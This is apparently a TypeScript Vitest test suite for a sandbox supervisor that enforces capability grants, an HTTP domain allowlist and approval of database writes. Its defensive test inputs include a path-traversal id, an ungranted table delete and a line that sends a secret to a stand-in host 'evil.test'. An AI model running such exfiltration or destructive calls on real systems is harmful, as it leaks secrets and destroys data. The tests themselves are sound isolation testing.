// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Elamaran Elangovan

import { describe, it, expect } from "vitest";
import { SandboxSupervisor } from "../supervisor.ts";
import { RuntimeUnavailable } from "../runtimes/base.runtime.ts";
import { FakeBridge, fakeFetch, sandbox } from "./fakes.ts";

function setup(opts: { fetch?: typeof fetch } = {}) {
  const bridge = new FakeBridge();
  const sup = new SandboxSupervisor({ bridge, fetch: opts.fetch });
  return { bridge, sup };
}

describe("supervisor — lifecycle", () => {
  it("spawns a sandbox attached to a broker task for its tenant", async () => {
    const { bridge, sup } = setup();
    const id = await sup.spawnSandbox(sandbox([], { tenantId: "tenant-7" }));
    expect(bridge.attached.get(id)).toBe("tenant-7");
    expect(sup.status(id)).toMatchObject({ status: "ready", tenantId: "tenant-7", tainted: false });
  });

  it("refuses runtimes that do not isolate, and ones that are not available here", async () => {
    const { bridge, sup } = setup();
    await expect(sup.spawnSandbox(sandbox([], { runtime: "worker-thread" }))).rejects.toBeInstanceOf(RuntimeUnavailable);
    await expect(sup.spawnSandbox(sandbox([], { runtime: "microvm-adapter" }))).rejects.toBeInstanceOf(RuntimeUnavailable);
    expect(bridge.attached.size).toBe(0);
  });

  it.each([
    ["a bad id", sandbox([], { id: "../etc" })],
    ["no tenant", sandbox([], { tenantId: "" })],
    ["an unknown capability", sandbox(["ROOT" as any])],
    ["a memory cap above 512 MB", sandbox([], { maxMemoryMb: 4096 })],
    ["a zero timeout", sandbox([], { timeoutMs: 0 })],
  ])("rejects a config with %s", async (_why, cfg) => {
    const { sup } = setup();
    await expect(sup.spawnSandbox(cfg)).rejects.toThrow();
  });

  it("refuses a duplicate sandbox id", async () => {
    const { sup } = setup();
    const cfg = sandbox();
    await sup.spawnSandbox(cfg);
    await expect(sup.spawnSandbox(cfg)).rejects.toThrow(/already in use/);
  });

  it("runs pure compute with no grants at all", async () => {
    const { sup } = setup();
    const id = await sup.spawnSandbox(sandbox());
    const r = await sup.executeInSandbox(id, `console.log("n =", context.n); return context.n * 2;`, { n: 21 });
    expect(r).toMatchObject({ success: true, data: 42, proposals: [], logs: ["n = 21"] });
  });

  it("a timeout kills the run but not the sandbox", async () => {
    const { sup } = setup();
    const id = await sup.spawnSandbox(sandbox([], { timeoutMs: 150 }));
    expect((await sup.executeInSandbox(id, `while (true) {}`, {})).killed).toMatch(/timeout/);
    expect(sup.status(id).status).toBe("ready");
    expect((await sup.executeInSandbox(id, `return "again";`, {})).data).toBe("again");
    expect(sup.violations()).toEqual([]);
  });

  it("an ungranted syscall kills the run, logs a violation and terminates the sandbox for good", async () => {
    const { bridge, sup } = setup();
    const id = await sup.spawnSandbox(sandbox([]));
    const r = await sup.executeInSandbox(id, `console.log("about to write"); await db.delete("orders"); return "survived";`, {});
    expect(r.success).toBe(false);
    expect(r.killed).toMatch(/policy violation/);
    expect(r.logs).toEqual(["about to write"]);
    expect(bridge.writes).toEqual([]); // nothing reached the broker
    expect(sup.violations()).toHaveLength(1);
    expect(sup.violations()[0]).toMatchObject({ sandboxId: id, tenantId: "tenant-a", syscall: { op: "db.mutate", mutation: { table: "orders", operation: "delete" } } });
    await Promise.resolve();
    expect(bridge.violations).toHaveLength(1);
    expect(sup.status(id).status).toBe("terminated");
    expect(bridge.detached).toEqual([id]);
    await expect(sup.executeInSandbox(id, `return 1;`, {})).rejects.toThrow(/terminated/);
  });

  it("a malformed syscall is a violation too", async () => {
    const { sup } = setup();
    const id = await sup.spawnSandbox(sandbox(["MUTATE_STATE"]));
    const r = await sup.executeInSandbox(id, `await db.insert(42, { x: 1 });`, {});
    expect(r.killed).toMatch(/malformed syscall/);
    expect(sup.status(id).status).toBe("terminated");
  });

  it("terminating a running sandbox kills its run", async () => {
    const { sup } = setup();
    const id = await sup.spawnSandbox(sandbox([], { timeoutMs: 5000 }));
    const running = sup.executeInSandbox(id, `for (;;) await null;`, {});
    await new Promise((r) => setTimeout(r, 50));
    await sup.terminateSandbox(id);
    expect((await running).killed).toMatch(/terminated/);
    expect(sup.status(id).status).toBe("terminated");
  });

  it("refuses to run an unknown sandbox", async () => {
    const { sup } = setup();
    await expect(sup.executeInSandbox("nope", "return 1", {})).rejects.toThrow(/no such sandbox/);
  });
});

describe("supervisor — routing granted syscalls (needs your checkSyscall)", () => {
  it("MUTATE_STATE: a write becomes a proposal, and the guest sees the broker's verdict", async () => {
    const { bridge, sup } = setup();
    bridge.decide = (m) => (m.operation === "delete" ? { status: "awaiting_approval", firedRules: [{ name: "blast-radius-high", severity: "approval", detail: "900 rows" } as any] } : { status: "executed", firedRules: [] });
    const id = await sup.spawnSandbox(sandbox(["MUTATE_STATE"]));
    const r = await sup.executeInSandbox(
      id,
      `const a = await db.insert("orders", { amount: 5 });
       const b = await db.delete("orders", { status: "stale" });
       return [a.status, b.status, b.approved];`,
      {},
    );
    expect(r.data).toEqual(["executed", "awaiting_approval", false]);
    expect(r.proposals.map((p) => p.status)).toEqual(["executed", "awaiting_approval"]);
    expect(bridge.writes.map((w) => w.mutation)).toEqual([
      { table: "orders", operation: "insert", data: { amount: 5 }, where: undefined },
      { table: "orders", operation: "delete", data: {}, where: { status: "stale" } },
    ]);
  });

  it("READ_ONLY: reads return rows; a refused read is an error the guest can catch", async () => {
    const { bridge, sup } = setup();
    bridge.rows = [{ id: 1 }];
    const id = await sup.spawnSandbox(sandbox(["READ_ONLY"]));
    expect((await sup.executeInSandbox(id, `return await db.select("orders", { id: 1 });`, {})).data).toEqual([{ id: 1 }]);
    bridge.readStatus = "blocked";
    const r = await sup.executeInSandbox(id, `try { await db.select("customers"); } catch (e) { return e.message; }`, {});
    expect(r.data).toMatch(/read blocked/);
  });

  it("EXTERNAL_HTTP: only allowlisted hosts are fetched; anything else is a violation", async () => {
    const f = fakeFetch(() => ({ body: '{"ok":true}', headers: { "content-type": "application/json" } }));
    const { sup } = setup({ fetch: f.impl });
    const id = await sup.spawnSandbox(sandbox(["EXTERNAL_HTTP"], { allowedDomains: ["api.allowed.test"] }));
    const ok = await sup.executeInSandbox(id, `const r = await api.fetch("https://api.allowed.test/v1"); return JSON.parse(r.body);`, {});
    expect(ok.data).toEqual({ ok: true });
    const bad = await sup.executeInSandbox(id, `await api.fetch("https://evil.test/?leak=" + context.secret);`, { secret: "s3cr3t" });
    expect(bad.killed).toMatch(/policy violation/);
    expect(f.calls).toEqual(["https://api.allowed.test/v1"]);
  });
});
